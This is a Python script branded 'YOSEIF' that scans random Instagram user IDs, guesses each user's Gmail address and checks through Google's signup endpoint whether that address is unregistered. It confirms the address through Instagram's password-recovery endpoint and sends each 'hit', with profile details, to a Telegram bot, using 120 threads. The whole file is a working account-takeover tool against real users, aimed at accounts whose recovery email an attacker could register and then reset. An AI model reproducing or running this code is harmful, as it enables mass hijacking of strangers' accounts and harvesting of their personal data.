import os
import cfonts
from cfonts import render
import requests
from bs4 import BeautifulSoup
import json
import re
import sys
from datetime import datetime, timedelta, timezone
from user_agent import generate_user_agent
from user_agent import generate_user_agent as ggb
from rich.console import Console
from rich.panel import Panel
import threading
import webbrowser
import random
import hashlib
import uuid
from colorama import Fore, Style
from requests import post as pp
from random import choice as cc
from random import randrange as rr
import subprocess
import importlib.util
import time

session = requests.Session()

IST_OFFSET = timedelta(hours=5, minutes=30)

c1 = '\x1b[38;5;120m'
j21 = '\x1b[38;5;204m'
p1 = '\x1b[38;5;150m'
cyan = '\x1b[1m\x1b;36m'
x = '\x1b[1;33m'
white = '\x1b[1;37m'
z = '\x1b[1;31m'

print('━' * 66)
logo = render('YOSEIF', font='block', colors=['white', 'black'], align='center', background='cyan', space=True)
print(logo)
print('━' * 66)
time.sleep(1)

total = 0
hits = 0
badinsta = 0
bademail = 0
goodig = 0
b = random.randint(5,208)
bo = f'\x1b[38;5;{b}m'
print("")
Token=input("BOT TOKEN : ")
ID=input('USER ID : ')    

def safe_int_input(prompt, default):
    try:
        value = input(prompt).strip()
        return int(value) if value else default
    except:
        return default

print('\nSelect a year for user ID range:')
print("1 - 2011")
print("2 - 2012") 
print("3 - 2013")
print("4 - 2014")
print("5 - 2015")
print("6 - 2016")
print("7 - 2017")
print("8 - 2018")
print("9 - 2019")
print("10 - 2011 » 2019")

year_choice = safe_int_input('Enter your year choice (1-10): ', 5)

year_ranges = {
    1: (1279000, 17750000),       
    2: (17750001, 279760000),      
    3: (279760001, 900990000),     
    4: (900990001, 1629010000),    
    5: (1629010001, 2369359761),   
    6: (2369359762, 4239516754),   
    7: (4239516755, 6345108209),   
    8: (6345108210, 10016232395),  
    9: (10016232396, 27238602159),
    10:(900990001, 27238602159)
}

bbk, Ido = year_ranges.get(year_choice, year_ranges[5]) 

os.system('clear')

def pppp():
    global badinsta,hits,bademail,goodig

    output = (f"\r"
              f"HITS : {hits}    "
              f"BAD IG : {badinsta}    "
              f"BAD MAIL : {bademail}   "
              f"  <3 YOSEIF ")
    sys.stdout.write(output)
    sys.stdout.flush()
    
yy = 'azertyuiopmlkjhgfdsqwxcvbn'
def tll():
    try:
        n1 = ''.join(cc(yy) for i in range(rr(6, 9)))
        n2 = ''.join(cc(yy) for i in range(rr(3, 9)))
        host = ''.join(cc(yy) for i in range(rr(15, 30)))
        he3 = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            'user-agent': str(ggb()),
        }
        res1 = requests.get(
            'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', 
            headers=he3
        )
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        cookies = {
            '__Host-GAPS': host
        }
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            'user-agent': ggb(),
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open('tl.txt', 'w',encoding='utf-8') as f:
            f.write(f'{tl}//{host}\n')
    except Exception as e:
        print(e)
        tll()
tll()

def rest(user):
    max_retries = 2
    for attempt in range(max_retries):
        try:
            headers = {
                'X-Pigeon-Session-Id': str(uuid.uuid4()),
                'X-Pigeon-Rawclienttime': str(time.time()),
                'X-IG-Connection-Speed': '-1kbps',
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-App-ID': '567067343352427',
                'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
                'Accept-Language': 'en-GB, en-US',
                'Cookie': f'mid={uuid.uuid4().hex[:12]}; csrftoken={uuid.uuid4().hex[:32]}',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'X-FB-HTTP-Engine': 'Liger',
                'Connection': 'keep-alive',
            }
            data = {
                'signed_body': f'{hashlib.md5(str(time.time()).encode()).hexdigest()}.{{"_csrftoken":"{uuid.uuid4().hex[:32]}","adid":"{uuid.uuid4()}","guid":"{uuid.uuid4()}","device_id":"android-{hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]}","query":"{user}"}}',
                'ig_sig_key_version': '4',
            }
            response = requests.post(
                'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',
                headers=headers,
                data=data,
            ).json()
            
            if 'email' in response:
                email = response['email']
                if (email and 
                    email != 'no REST !' and 
                    '@' in email and 
                    '.' in email and 
                    len(email) > 5 and
                    not email.endswith('@instagram.com') and
                    not email.endswith('@facebook.com') and
                    not email.endswith('@fb.com') and
                    not email.endswith('@meta.com') and
                    'example' not in email.lower() and
                    'test' not in email.lower() and
                    'temp' not in email.lower()):
                    return email
                else:
                    return 'no REST !'
            else:
                return 'no REST !'
                
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(1)  
                continue
            return 'no REST !'
    return 'no REST !'

def date(Id):
    try:
        uid = int(Id)
        if 1 < uid < 1279000:
            return 2010
        elif 1279001 <= uid < 17750000:
            return 2011
        elif 17750001 <= uid < 279760000:
            return 2012
        elif 279760001 <= uid < 900990000:
            return 2013
        elif 900990001 <= uid < 1629010000:
            return 2014
        elif 1900000000 <= uid < 2500000000:
            return 2015
        elif 2500000000 <= uid < 3713668786:
            return 2016
        elif 3713668786 <= uid < 5699785217:
            return 2017
        elif 5699785217 <= uid < 8507940634:
            return 2018
        elif 8507940634 <= uid < 21254029834:
            return 2019
        else:
            return "2020-2023"
    except Exception:
        return 'hhhh'

def InfoAcc(username, gg, reset_email):  
    global total

    rr = infoinsta.get(username,{})

    Id = rr.get('pk', None)
    full_name = rr.get('full_name', None)
    fows = rr.get('follower_count', None)
    fowg = rr.get('following_count', None)
    pp = rr.get('media_count', None)
    isPraise = rr.get('is_private', None)
    bio = rr.get('biography', None)
    is_verified = rr.get('is_verified', None)
    bizz = rr.get('is_business', None)
    
    business_display = "No"
    if bizz is not None:
        business_display = "Yes" if bizz else "No"
    else:
        if rr.get('is_business_account') is not None:
            business_display = "Yes" if rr.get('is_business_account') else "No"
        elif rr.get('business_email') is not None:
            business_display = "Yes"
        elif rr.get('business_phone_number') is not None:
            business_display = "Yes"
        elif rr.get('business_address') is not None:
            business_display = "Yes"
        elif rr.get('category') and rr.get('category') != 'NONE':
            business_display = "Yes"

    try:
        if (fows and pp):
            if (int(fows) >= 25 and int(pp) >= 0):
                meta = True
            else:
                meta = False
        else:
            meta = False
    except:
        meta = False

    total += 1
    ss = f'''
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Name         : {full_name}
Username     : @{username}
Email        : {username}@gmail.com
Followers    : {fows}
Following    : {fowg}
Posts        : {pp}
Private      : {isPraise}
Year         : {date(Id)}  
Reset Email  : {reset_email}
Meta         : {meta}
Business     : {business_display}
Link         : https://www.instagram.com/{username}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Developer    : @Loosbieh
'''
    print(ss)
    with open("YOSEIF.txt", "a", encoding='utf-8') as file:
        file.write(ss+"\n")
    try:
        try:
            requests.get(f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text={ss}")
        except Exception as e:
            print(f"  h ") 
    except:
        print(f"  h ")

def Gmail(email):
    global bademail, hits
    try:
        if '@' in email:
            email = str(email).split('@')[0]

        try:
            o = open('tl.txt', 'r').read().splitlines()[0]
        except:
            o = open('tl.txt', 'r').read().splitlines()[0]

        tl, host = o.split('//')

        cookies = {
        '__Host-GAPS': host
    }
        headers = {
        'authority': 'accounts.google.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'google-accounts-xsrf': '1',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
        'user-agent': ggb(),
    }
        params = {
        'TL': tl,
    }
        data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        response = pp(
            'https://accounts.google.com/_/signup/usernameavailability',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
        )
        if '"gf.uar",1' in str(response.text):

            reset_status = rest(email)
            if (reset_status != 'no REST !' and 
                '@' in reset_status and 
                '.' in reset_status and 
                len(reset_status) > 5 and
                not reset_status.endswith('@instagram.com') and
                not reset_status.endswith('@facebook.com') and
                not reset_status.endswith('@fb.com') and
                not reset_status.endswith('@meta.com') and
                'example' not in reset_status.lower() and
                'test' not in reset_status.lower() and
                'temp' not in reset_status.lower()):
                
                hits += 1
                pppp()
                if '@' not in email:
                    ok = email + '@gmail.com'
                    username, gg = ok.split('@')
                    InfoAcc(username, gg, reset_status)  
                else:
                    username, gg = email.split('@')
                    InfoAcc(username, gg, reset_status)  
            else:
                bademail += 1
                pppp()
        else: 
          bademail += 1
          pppp()
    except:''

def format_number(value):
    value = float(value)
    if value >= 1000000:
        return f"{value / 1000000:.1f}m"
    elif value >= 1000:
        return f"{value / 1000:.1f}k"
    return str(int(value))

def check_on(email):
    global goodig, badinsta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        'User-Agent': ua,
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    data = {
        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
            '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'adid': uui,
            'guid': uui,
            'device_id': device_id,
            'query': email
        }),
        'ig_sig_key_version': '4',
    }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
 
    if email in response:
        Gmail(email)
        goodig += 1
        pppp()
    else:
        badinsta += 1
        pppp()

infoinsta = {}
ids=[]
def rand_ids(bbk,Ido):  
  Id= str(random.randrange(bbk, Ido))
  if Id not in ids:
    ids.append(Id)
    return Id
  else:
    rand_ids(bbk,Ido)

def uuu():
 while True:
  try:
    domain='@gmail.com'

    while True:      
      rnd=str(random.randint(150, 999))
      user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
      Id = rand_ids(bbk, Ido)  
      lsd=''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(32))
      headers = {
    'accept': '*/*',
    'accept-language': 'en,en-US;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'dnt': '1',
    'origin': 'https://www.instagram.com',
    'priority': 'u=1, i',
    'referer': 'https://www.instagram.com/cristiano/following/',
    'user-agent': user_agent,
    'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
    'x-fb-lsd': lsd,
}
      data = {
    'lsd': lsd,
    'fb_api_caller_class': 'RelayModern',
    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
    'variables': '{"userID":"'+str(Id)+'","username":"cristiano"}',
    'server_timestamps': 'true',
    'doc_id': '7717269488336001',
}

      response = session.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
      username = response.json().get('data', {}).get('user', {}).get('username')
      infoinsta[username] = response.json().get('data', {}).get('user', {})
      rr = infoinsta.get(username,{})
      fows = rr.get('follower_count', None)
      if fows >= 20:
	      email = username + domain
	      check_on(email)
          
  except Exception as e:''

    
threads = []
def printing():
    
    for i in range(120):
        t = threading.Thread(target=uuu)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

printing()